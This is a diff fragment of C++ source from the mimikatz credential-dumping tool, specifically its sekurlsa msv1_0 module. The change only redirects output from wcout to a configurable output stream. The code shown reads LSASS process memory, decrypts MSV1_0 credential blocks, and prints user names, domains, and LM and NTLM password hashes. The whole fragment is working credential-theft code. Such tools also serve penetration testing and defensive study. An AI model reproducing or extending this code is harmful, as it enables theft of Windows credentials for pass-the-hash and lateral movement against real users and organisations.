@@ -153,26 +153,26 @@ bool WINAPI mod_mimikatz_sekurlsa_msv1_0::getMSVLogonData(__in PLUID logId, __in
 								if(mod_memory::readMemory(mesCreds->PrimaryCredentials, kiwiMSVPrimaryCredentials, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS), mod_mimikatz_sekurlsa::hLSASS))
 								{
 									decryptAndDisplayCredsBlock(&reinterpret_cast<PKIWI_MSV1_0_PRIMARY_CREDENTIALS>(kiwiMSVPrimaryCredentials)->Credentials, justSecurity);
-								} else wcout << L"n.e. (Lecture KIWI_MSV1_0_PRIMARY_CREDENTIALS KO)";
+								} else (*outputStream) << L"n.e. (Lecture KIWI_MSV1_0_PRIMARY_CREDENTIALS KO)";
 								delete [] kiwiMSVPrimaryCredentials;
 
-							} else wcout << L"n.s. (PrimaryCredentials KO)";
+							} else (*outputStream) << L"n.s. (PrimaryCredentials KO)";
 
-						}else wcout << L"n.e. (Lecture KIWI_MSV1_0_CREDENTIALS KO)";
+						}else (*outputStream) << L"n.e. (Lecture KIWI_MSV1_0_CREDENTIALS KO)";
 						delete [] kiwiMSVCredentials;
 
-					} else wcout << L"n.s. (Credentials KO)";
+					} else (*outputStream) << L"n.s. (Credentials KO)";
 
-				} else wcout << L"n.e. (Lecture KIWI_MSV1_0_LIST KO)";
+				} else (*outputStream) << L"n.e. (Lecture KIWI_MSV1_0_LIST KO)";
 				delete [] kiwiMSVListEntry;
 
 				break;
 			}
 		}
 		if(!pLogSession)
-			wcout << L"n.t. (LUID KO)";
+			(*outputStream) << L"n.t. (LUID KO)";
 	}
-	else wcout << L"n.a. (msv1_0 KO)";
+	else (*outputStream) << L"n.a. (msv1_0 KO)";
 	return true;
 }
 
@@ -193,19 +193,19 @@ bool mod_mimikatz_sekurlsa_msv1_0::decryptAndDisplayCredsBlock(LSA_UNICODE_STRIN
 			wstring ntHash = mod_text::stringOfHex(mesCreds->NtOwfPassword, sizeof(mesCreds->NtOwfPassword));
 
 			if(justSecurity)
-				wcout << L"lm{ " << lmHash << L" }, ntlm{ " << ntHash << L" }";
+				(*outputStream) << L"lm{ " << lmHash << L" }, ntlm{ " << ntHash << L" }";
 			else
 			{
-				wcout << endl <<
+				(*outputStream) << endl <<
 					L"\t * Utilisateur  : " << mod_text::stringOfSTRING(mesCreds->UserName) << endl <<
 					L"\t * Domaine      : " << mod_text::stringOfSTRING(mesCreds->LogonDomainName) << endl <<
 					L"\t * Hash LM      : " << lmHash << endl <<
 					L"\t * Hash NTLM    : " << ntHash;
 			}
-		} else wcout << L"n.e. (Lecture Block Credentials KO)";
+		} else (*outputStream) << L"n.e. (Lecture Block Credentials KO)";
 
 		delete [] monBuffer;
-	} else wcout << L"n.s. (Block Credentials KO)";
+	} else (*outputStream) << L"n.s. (Block Credentials KO)";
 
 	return true;
 }
